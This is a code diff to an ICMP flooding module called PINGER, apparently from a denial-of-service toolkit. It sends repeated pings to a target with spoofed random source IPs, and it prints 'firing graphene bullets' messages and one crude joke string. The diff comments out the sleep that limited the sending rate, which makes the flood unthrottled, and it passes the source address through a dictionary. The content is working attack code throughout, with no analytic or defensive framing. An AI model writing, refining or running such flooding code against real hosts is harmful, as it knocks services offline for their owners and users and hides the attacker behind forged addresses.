@@ -31,18 +31,18 @@ def randInt():
     x = random.randint(1,65535) # TCP ports
     return x
 
-def pingerize(ip, sport, rounds, source=None):
+def pingerize(ip, sport, rounds, address_dict):
     n=0
     try:
         for x in range (0,int(rounds)):
             n=n+1
             IP_p = IP()
-            if source is None:
+            if address_dict['source'] is None:
                 print("[Info] [PINGER] Using random source IP")
                 IP_p.src = randIP()
             else:
                 print("[Info] [PINGER] Using given source IP")
-                IP_p.src = source
+                IP_p.src = address_dict['source']
             try:
                 IP_p.dst = ip
             except:
@@ -50,15 +50,15 @@ def pingerize(ip, sport, rounds, source=None):
                 break
             try:
                 send(IP_p/ICMP(), verbose=0)
-                print("[Info] [AI] [PINGER] Firing 'graphene bullets' ["+str(n)+"] -> [SHOOTING!]")
-                time.sleep(1/PINGER_SPEED) # sleep time required for balanced sucess
+                # print("[Info] [AI] [PINGER] Firing 'graphene bullets' ["+str(n)+"] -> [SHOOTING!]")
+                # time.sleep(1/PINGER_SPEED) # sleep time required for balanced sucess
             except:
                 print("[Error] [AI] [PINGER] Failed to engage with 'graphene bullets' ["+str(n)+"]")
     except:
         print("[Error] [AI] [PINGER] Failing to engage... -> Is still target online? -> [Checking!]")
 
 class PINGER(object):
-    def attacking(self, target, rounds,source=None):
+    def attacking(self, target, rounds, address_dict):
         print("[Info] [AI] ICMP (PINGER) is ready to fire: [" , rounds, "graphene bullets ]")
         if target.startswith('http://'):
             target = target.replace('http://','')
@@ -82,4 +82,4 @@ class PINGER(object):
         if ip == "127.0.0.1" or ip == "localhost":
             print("[Info] [AI] [PINGER] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
             return
-        pingerize(ip, sport, rounds, source) # attack with PINGER using threading
+        pingerize(ip, sport, rounds, address_dict) # attack with PINGER using threading
